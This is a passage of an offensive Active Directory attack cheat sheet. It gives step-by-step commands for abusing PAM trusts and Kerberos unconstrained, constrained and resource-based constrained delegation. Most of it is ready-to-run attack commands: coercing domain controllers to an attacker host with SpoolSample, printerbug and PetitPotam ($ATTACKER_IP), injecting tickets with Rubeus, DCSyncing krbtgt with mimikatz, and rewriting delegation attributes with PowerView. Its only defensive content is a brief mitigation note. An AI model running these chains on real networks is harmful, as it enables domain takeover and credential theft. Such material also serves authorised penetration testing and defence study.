<div class="highlight"><pre><span></span><code><a id="__codelineno-271-1" name="__codelineno-271-1" href="#__codelineno-271-1"></a><span class="p">.\</span><span class="n">asktgs</span><span class="p">.</span><span class="n">exe</span> <span class="n">c</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">trust</span><span class="p">.</span><span class="n">kirbi</span> <span class="n">CIFS</span><span class="p">/</span><span class="n">machine</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-271-2" name="__codelineno-271-2" href="#__codelineno-271-2"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">c</span><span class="p">:\</span><span class="n">ad</span><span class="p">\</span><span class="n">tools</span><span class="p">\</span><span class="n">mcorp-ticket</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">LDAP</span><span class="p">/</span><span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
</code></pre></div>
<p>Inject the ST file and access the targeted service with the spoofed rights.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-272-1" name="__codelineno-272-1" href="#__codelineno-272-1"></a><span class="n">kirbikator</span> <span class="n">lsa</span> <span class="p">.\</span><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span>
<a id="__codelineno-272-2" name="__codelineno-272-2" href="#__codelineno-272-2"></a><span class="nb">ls </span><span class="p">\\</span><span class="n">machine</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
</code></pre></div>
<h2 id="privileged-access-management-pam-trust">Privileged Access Management (PAM) Trust</h2>
<blockquote>
<p>PAM (Privileged access managment) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon. Temporary Group Membership also introduced so perms only given for set time.
Enumeration</p>
</blockquote>
<p>Requirements: 
* Windows Server 2016 or earlier   </p>
<p>If we compromise the bastion we get <code>Domain Admins</code> privileges on the other domain</p>
<ul>
<li>Default configuration for PAM Trust
    <div class="highlight"><pre><span></span><code><a id="__codelineno-273-1" name="__codelineno-273-1" href="#__codelineno-273-1"></a><span class="c"># execute on our forest</span>
<a id="__codelineno-273-2" name="__codelineno-273-2" href="#__codelineno-273-2"></a><span class="n">netdom</span> <span class="n">trust</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">bastion</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ForestTransitive</span><span class="p">:</span><span class="n">Yes</span> 
<a id="__codelineno-273-3" name="__codelineno-273-3" href="#__codelineno-273-3"></a><span class="n">netdom</span> <span class="n">trust</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">bastion</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">EnableSIDHistory</span><span class="p">:</span><span class="n">Yes</span> 
<a id="__codelineno-273-4" name="__codelineno-273-4" href="#__codelineno-273-4"></a><span class="n">netdom</span> <span class="n">trust</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">bastion</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">EnablePIMTrust</span><span class="p">:</span><span class="n">Yes</span> 
<a id="__codelineno-273-5" name="__codelineno-273-5" href="#__codelineno-273-5"></a><span class="n">netdom</span> <span class="n">trust</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">bastion</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">Quarantine</span><span class="p">:</span><span class="n">No</span>
<a id="__codelineno-273-6" name="__codelineno-273-6" href="#__codelineno-273-6"></a><span class="c"># execute on our bastion</span>
<a id="__codelineno-273-7" name="__codelineno-273-7" href="#__codelineno-273-7"></a><span class="n">netdom</span> <span class="n">trust</span> <span class="n">bastion</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ForestTransitive</span><span class="p">:</span><span class="n">Yes</span>
</code></pre></div></li>
<li>Enumerate PAM trusts
    <div class="highlight"><pre><span></span><code><a id="__codelineno-274-1" name="__codelineno-274-1" href="#__codelineno-274-1"></a><span class="c"># Detect if current forest is PAM trust</span>
<a id="__codelineno-274-2" name="__codelineno-274-2" href="#__codelineno-274-2"></a><span class="n">Import</span> <span class="n">ADModule</span>
<a id="__codelineno-274-3" name="__codelineno-274-3" href="#__codelineno-274-3"></a><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">{(</span><span class="n">ForestTransitive</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">)</span> <span class="o">-and</span> <span class="p">(</span><span class="n">SIDFilteringQuarantined</span> <span class="o">-eq</span> <span class="nv">$False</span><span class="p">)}</span>
<a id="__codelineno-274-4" name="__codelineno-274-4" href="#__codelineno-274-4"></a>
<a id="__codelineno-274-5" name="__codelineno-274-5" href="#__codelineno-274-5"></a><span class="c"># Enumerate shadow security principals </span>
<a id="__codelineno-274-6" name="__codelineno-274-6" href="#__codelineno-274-6"></a><span class="nb">Get-ADObject</span> <span class="n">-SearchBase</span> <span class="p">(</span><span class="s2">&quot;CN=Shadow Principal Configuration,CN=Services,&quot;</span> <span class="p">+</span> <span class="p">(</span><span class="nb">Get-ADRootDSE</span><span class="p">).</span><span class="n">configurationNamingContext</span><span class="p">)</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span><span class="p">,</span><span class="n">member</span><span class="p">,</span><span class="n">msDS-ShadowPrincipalSid</span> <span class="p">|</span> <span class="nb">fl</span>
<a id="__codelineno-274-7" name="__codelineno-274-7" href="#__codelineno-274-7"></a>
<a id="__codelineno-274-8" name="__codelineno-274-8" href="#__codelineno-274-8"></a><span class="c"># Enumerate if current forest is managed by a bastion forest</span>
<a id="__codelineno-274-9" name="__codelineno-274-9" href="#__codelineno-274-9"></a><span class="c"># Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External</span>
<a id="__codelineno-274-10" name="__codelineno-274-10" href="#__codelineno-274-10"></a><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">{(</span><span class="n">ForestTransitive</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">)}</span> 
</code></pre></div></li>
<li>Compromise<ul>
<li>Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)</li>
<li>Using SID History</li>
</ul>
</li>
<li>Persistence
  <div class="highlight"><pre><span></span><code><a id="__codelineno-275-1" name="__codelineno-275-1" href="#__codelineno-275-1"></a><span class="c"># Add a compromised user to the group </span>
<a id="__codelineno-275-2" name="__codelineno-275-2" href="#__codelineno-275-2"></a><span class="nb">Set-ADObject</span> <span class="n">-Identity</span> <span class="s2">&quot;CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local&quot;</span> <span class="n">-Add</span> <span class="p">@{</span><span class="s1">&#39;member&#39;</span><span class="p">=</span><span class="s2">&quot;CN=Administrator,CN=Users,DC=domain,DC=local&quot;</span><span class="p">}</span>
</code></pre></div></li>
</ul>
<h2 id="kerberos-unconstrained-delegation">Kerberos Unconstrained Delegation</h2>
<blockquote>
<p>The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html </p>
<p>When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. </p>
</blockquote>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Unconstrained delegation used to be the only option available in Windows 2000</p>
<blockquote>
<p><strong>Warning</strong>
Remember to coerce to a HOSTNAME if you want a Kerberos Ticket</p>
</blockquote>
<h3 id="spoolservice-abuse-with-unconstrained-delegation">SpoolService Abuse with Unconstrained Delegation</h3>
<p>The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.</p>
<p><strong>Requirements</strong>:
- Object with Property <strong>Trust this computer for delegation to any service (Kerberos only)</strong>
- Must have <strong>ADS_UF_TRUSTED_FOR_DELEGATION</strong> 
- Must not have <strong>ADS_UF_NOT_DELEGATED</strong> flag
- User must not be in the <strong>Protected Users</strong> group 
- User must not have the flag <strong>Account is sensitive and cannot be delegated</strong></p>
<h4 id="find-delegation">Find delegation</h4>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> : Domain controllers usually have unconstrained delegation enabled.  <br />
Check the <code>TRUSTED_FOR_DELEGATION</code> property.</p>
<ul>
<li>
<p><a href="https://github.com/samratashok/ADModule">ADModule</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-276-1" name="__codelineno-276-1" href="#__codelineno-276-1"></a><span class="c"># From https://github.com/samratashok/ADModule</span>
<a id="__codelineno-276-2" name="__codelineno-276-2" href="#__codelineno-276-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">TrustedForDelegation</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-277-1" name="__codelineno-277-1" href="#__codelineno-277-1"></a><span class="p">$&gt;</span> <span class="n">ldapdomaindump</span> <span class="n">-u</span> <span class="s2">&quot;DOMAIN\\Account&quot;</span> <span class="n">-p</span> <span class="s2">&quot;Password123*&quot;</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>   
<a id="__codelineno-277-2" name="__codelineno-277-2" href="#__codelineno-277-2"></a><span class="n">grep</span> <span class="n">TRUSTED_FOR_DELEGATION</span> <span class="n">domain_computers</span><span class="p">.</span><span class="n">grep</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki">CrackMapExec module</a> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-278-1" name="__codelineno-278-1" href="#__codelineno-278-1"></a><span class="n">cme</span> <span class="n">ldap</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="p">-</span><span class="n">-trusted-for-delegation</span>
</code></pre></div></p>
</li>
<li>
<p>BloodHound: <code>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</code></p>
</li>
<li>Powershell Active Directory module: <code>Get-ADComputer -LDAPFilter "(&amp;(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl</code></li>
</ul>
<h4 id="spoolservice-status">SpoolService status</h4>
<p>Check if the spool service is running on the remote host</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-279-1" name="__codelineno-279-1" href="#__codelineno-279-1"></a><span class="nb">ls </span><span class="p">\\</span><span class="n">dc01</span><span class="p">\</span><span class="n">pipe</span><span class="p">\</span><span class="n">spoolss</span>
<a id="__codelineno-279-2" name="__codelineno-279-2" href="#__codelineno-279-2"></a><span class="n">python</span> <span class="n">rpcdump</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">password</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
</code></pre></div>
<h4 id="monitor-with-rubeus">Monitor with Rubeus</h4>
<p>Monitor incoming connections from Rubeus.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-280-1" name="__codelineno-280-1" href="#__codelineno-280-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">1</span> 
</code></pre></div>
<h4 id="force-a-connect-back-from-the-dc">Force a connect back from the DC</h4>
<p>Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.</p>
<blockquote>
<p>SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface.</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-281-1" name="__codelineno-281-1" href="#__codelineno-281-1"></a><span class="c"># From https://github.com/leechristensen/SpoolSample</span>
<a id="__codelineno-281-2" name="__codelineno-281-2" href="#__codelineno-281-2"></a><span class="p">.\</span><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="n">VICTIM-DC-NAME</span> <span class="n">UNCONSTRAINED-SERVER-DC-NAME</span>
<a id="__codelineno-281-3" name="__codelineno-281-3" href="#__codelineno-281-3"></a><span class="p">.\</span><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="n">DC01</span><span class="p">.</span><span class="n">HACKER</span><span class="p">.</span><span class="n">LAB</span> <span class="n">HELPDESK</span><span class="p">.</span><span class="n">HACKER</span><span class="p">.</span><span class="n">LAB</span>
<a id="__codelineno-281-4" name="__codelineno-281-4" href="#__codelineno-281-4"></a><span class="c"># DC01.HACKER.LAB is the domain controller we want to compromise</span>
<a id="__codelineno-281-5" name="__codelineno-281-5" href="#__codelineno-281-5"></a><span class="c"># HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.</span>
<a id="__codelineno-281-6" name="__codelineno-281-6" href="#__codelineno-281-6"></a>
<a id="__codelineno-281-7" name="__codelineno-281-7" href="#__codelineno-281-7"></a><span class="c"># From https://github.com/dirkjanm/krbrelayx</span>
<a id="__codelineno-281-8" name="__codelineno-281-8" href="#__codelineno-281-8"></a><span class="n">printerbug</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;domain/username:password&#39;</span><span class="p">@&lt;</span><span class="n">VICTIM-DC-NAME</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">UNCONSTRAINED-SERVER-DC-NAME</span><span class="p">&gt;</span>
<a id="__codelineno-281-9" name="__codelineno-281-9" href="#__codelineno-281-9"></a>
<a id="__codelineno-281-10" name="__codelineno-281-10" href="#__codelineno-281-10"></a><span class="c"># From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689</span>
<a id="__codelineno-281-11" name="__codelineno-281-11" href="#__codelineno-281-11"></a><span class="n">python</span> <span class="n">dementor</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="n">domain</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="p">&lt;</span><span class="n">UNCONSTRAINED-SERVER-DC-NAME</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">VICTIM-DC-NAME</span><span class="p">&gt;</span>
</code></pre></div>
<p>If the attack worked you should get a TGT of the domain controller.</p>
<h4 id="load-the-ticket">Load the ticket</h4>
<p>Extract the base64 TGT from Rubeus output and load it to our current session.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-282-1" name="__codelineno-282-1" href="#__codelineno-282-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:&lt;</span><span class="n">ticket</span> <span class="n">base64</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">LDAP</span><span class="p">/</span><span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span><span class="p">,</span><span class="n">cifs</span><span class="p">/</span><span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
</code></pre></div>
<p>Alternatively you could also grab the ticket using Mimikatz :  <code>mimikatz # sekurlsa::tickets</code></p>
<p>Then you can use DCsync or another attack : <code>mimikatz # lsadump::dcsync /user:HACKER\krbtgt</code></p>
<h4 id="mitigation">Mitigation</h4>
<ul>
<li>Ensure sensitive accounts cannot be delegated</li>
<li>Disable the Print Spooler Service</li>
</ul>
<h3 id="ms-efsrpc-abuse-with-unconstrained-delegation">MS-EFSRPC Abuse with Unconstrained Delegation</h3>
<p>Using <code>PetitPotam</code>, another tool to coerce a callback from the targeted machine, instead of <code>SpoolSample</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-283-1" name="__codelineno-283-1" href="#__codelineno-283-1"></a><span class="c1"># Coerce the callback</span>
<a id="__codelineno-283-2" name="__codelineno-283-2" href="#__codelineno-283-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/topotam/PetitPotam
<a id="__codelineno-283-3" name="__codelineno-283-3" href="#__codelineno-283-3"></a>python3<span class="w"> </span>petitpotam.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$PASSWORD</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span><span class="nv">$TARGET_IP</span>
<a id="__codelineno-283-4" name="__codelineno-283-4" href="#__codelineno-283-4"></a>python3<span class="w"> </span>petitpotam.py<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span><span class="nv">$TARGET_IP</span>
<a id="__codelineno-283-5" name="__codelineno-283-5" href="#__codelineno-283-5"></a>
<a id="__codelineno-283-6" name="__codelineno-283-6" href="#__codelineno-283-6"></a><span class="c1"># Extract the ticket</span>
<a id="__codelineno-283-7" name="__codelineno-283-7" href="#__codelineno-283-7"></a>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>asktgs<span class="w"> </span>/ticket:&lt;ticket<span class="w"> </span>base64&gt;<span class="w"> </span>/ptt
</code></pre></div>
<h2 id="kerberos-constrained-delegation">Kerberos Constrained Delegation</h2>
<blockquote>
<p>Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,</p>
</blockquote>
<p>Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username).</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-284-1" name="__codelineno-284-1" href="#__codelineno-284-1"></a><span class="c"># Discover</span>
<a id="__codelineno-284-2" name="__codelineno-284-2" href="#__codelineno-284-2"></a><span class="p">$</span> <span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-exp</span> <span class="n">dnshostname</span>
<a id="__codelineno-284-3" name="__codelineno-284-3" href="#__codelineno-284-3"></a>
<a id="__codelineno-284-4" name="__codelineno-284-4" href="#__codelineno-284-4"></a><span class="c"># Find the service </span>
<a id="__codelineno-284-5" name="__codelineno-284-5" href="#__codelineno-284-5"></a><span class="p">$</span> <span class="nb">Get-DomainComputer</span> <span class="n">previous_result</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-exp</span> <span class="n">msds-AllowedToDelegateTo</span>
</code></pre></div>
<h3 id="exploit-the-constrained-delegation">Exploit the Constrained Delegation</h3>
<ul>
<li>Impacket
  <div class="highlight"><pre><span></span><code><a id="__codelineno-285-1" name="__codelineno-285-1" href="#__codelineno-285-1"></a>$<span class="w"> </span>getST.py<span class="w"> </span>-spn<span class="w"> </span>HOST/SQL01.DOMAIN<span class="w"> </span><span class="s1">&#39;DOMAIN/user:password&#39;</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.10
</code></pre></div></li>
<li>Rubeus
  <div class="highlight"><pre><span></span><code><a id="__codelineno-286-1" name="__codelineno-286-1" href="#__codelineno-286-1"></a>$<span class="w"> </span>./Rubeus.exe<span class="w"> </span>tgtdeleg<span class="w"> </span>/nowrap<span class="w"> </span><span class="c1"># this ticket can be used with /ticket:...</span>
<a id="__codelineno-286-2" name="__codelineno-286-2" href="#__codelineno-286-2"></a>$<span class="w"> </span>./Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/user:user_for_delegation<span class="w"> </span>/rc4:user_pwd_hash<span class="w"> </span>/impersonateuser:user_to_impersonate<span class="w"> </span>/domain:domain.com<span class="w"> </span>/dc:dc01.domain.com<span class="w"> </span>/msdsspn:cifs/srv01.domain.com<span class="w"> </span>/ptt
<a id="__codelineno-286-3" name="__codelineno-286-3" href="#__codelineno-286-3"></a>$<span class="w"> </span>./Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/user:MACHINE$<span class="w"> </span>/rc4:MACHINE_PWD_HASH<span class="w"> </span>/impersonateuser:Administrator<span class="w"> </span>/msdsspn:<span class="s2">&quot;cifs/dc.domain.com&quot;</span><span class="w"> </span>/altservice:cifs,http,host,rpcss,wsman,ldap<span class="w"> </span>/ptt
<a id="__codelineno-286-4" name="__codelineno-286-4" href="#__codelineno-286-4"></a>$<span class="w"> </span>dir<span class="w"> </span><span class="se">\\</span>dc.domain.com<span class="se">\c</span>$
</code></pre></div></li>
</ul>
<h3 id="impersonate-a-domain-user-on-a-resource">Impersonate a domain user on a resource</h3>
<p>Require:
* SYSTEM level privileges on a machine configured with constrained delegation</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-287-1" name="__codelineno-287-1" href="#__codelineno-287-1"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s1">&#39;System.IdentityModel&#39;</span><span class="p">)</span> <span class="p">|</span> <span class="nb">out-null</span>
<a id="__codelineno-287-2" name="__codelineno-287-2" href="#__codelineno-287-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$idToImpersonate</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">WindowsIdentity</span> <span class="p">@(</span><span class="s1">&#39;administrator&#39;</span><span class="p">)</span>
<a id="__codelineno-287-3" name="__codelineno-287-3" href="#__codelineno-287-3"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$idToImpersonate</span><span class="p">.</span><span class="n">Impersonate</span><span class="p">()</span>
<a id="__codelineno-287-4" name="__codelineno-287-4" href="#__codelineno-287-4"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="no">[System.Security.Principal.WindowsIdentity]</span><span class="p">::</span><span class="n">GetCurrent</span><span class="p">()</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span>
<a id="__codelineno-287-5" name="__codelineno-287-5" href="#__codelineno-287-5"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">ls </span><span class="p">\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">offense</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
</code></pre></div>
<h2 id="kerberos-resource-based-constrained-delegation">Kerberos Resource Based Constrained Delegation</h2>
<p>Resource-based Constrained Delegation was introduced in Windows Server 2012. </p>
<blockquote>
<p>The user sends a Service Ticket (ST) to access the service ("Service A"), and if the service is allowed to delegate to another pre-defined service ("Service B"), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</p>
</blockquote>
<ol>
<li>
<p>Import <strong>Powermad</strong> and <strong>Powerview</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-288-1" name="__codelineno-288-1" href="#__codelineno-288-1"></a><span class="n">PowerShell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span>
<a id="__codelineno-288-2" name="__codelineno-288-2" href="#__codelineno-288-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">powermad</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-288-3" name="__codelineno-288-3" href="#__codelineno-288-3"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">powerview</span><span class="p">.</span><span class="n">ps1</span>
</code></pre></div>
</li>
<li>
<p>Get user SID</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-289-1" name="__codelineno-289-1" href="#__codelineno-289-1"></a><span class="nv">$AttackerSID</span> <span class="p">=</span> <span class="nb">Get-DomainUser</span> <span class="n">SvcJoinComputerToDom</span> <span class="n">-Properties</span> <span class="n">objectsid</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-Expand</span> <span class="n">objectsid</span>
<a id="__codelineno-289-2" name="__codelineno-289-2" href="#__codelineno-289-2"></a><span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">Get-DomainObjectACL</span> <span class="n">dc01-ww2</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="n">lan</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="nv">$AttackerSID</span><span class="p">}</span>
<a id="__codelineno-289-3" name="__codelineno-289-3" href="#__codelineno-289-3"></a><span class="nv">$ACE</span>
<a id="__codelineno-289-4" name="__codelineno-289-4" href="#__codelineno-289-4"></a><span class="nb">ConvertFrom-SID</span> <span class="nv">$ACE</span><span class="p">.</span><span class="n">SecurityIdentifier</span>
</code></pre></div>
</li>
<li>
<p>Abuse <strong>MachineAccountQuota</strong> to create a computer account and set an SPN for it</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-290-1" name="__codelineno-290-1" href="#__codelineno-290-1"></a><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">swktest</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Weakest123*&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
</code></pre></div>
</li>
<li>
<p>Rewrite DC's <strong>AllowedToActOnBehalfOfOtherIdentity</strong> properties</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-291-1" name="__codelineno-291-1" href="#__codelineno-291-1"></a><span class="nv">$ComputerSid</span> <span class="p">=</span> <span class="nb">Get-DomainComputer</span> <span class="n">swktest</span> <span class="n">-Properties</span> <span class="n">objectsid</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-Expand</span> <span class="n">objectsid</span>
<a id="__codelineno-291-2" name="__codelineno-291-2" href="#__codelineno-291-2"></a><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="p">$(</span><span class="nv">$ComputerSid</span><span class="p">)</span><span class="s2">)&quot;</span>
<a id="__codelineno-291-3" name="__codelineno-291-3" href="#__codelineno-291-3"></a><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
<a id="__codelineno-291-4" name="__codelineno-291-4" href="#__codelineno-291-4"></a><span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
<a id="__codelineno-291-5" name="__codelineno-291-5" href="#__codelineno-291-5"></a><span class="nb">Get-DomainComputer</span> <span class="n">dc01-ww2</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="n">lan</span> <span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span>
<a id="__codelineno-291-6" name="__codelineno-291-6" href="#__codelineno-291-6"></a><span class="nv">$RawBytes</span> <span class="p">=</span> <span class="nb">Get-DomainComputer</span> <span class="n">dc01-ww2</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="n">lan</span> <span class="n">-Properties</span> <span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-expand</span> <span class="n">msds-allowedtoactonbehalfofotheridentity</span>
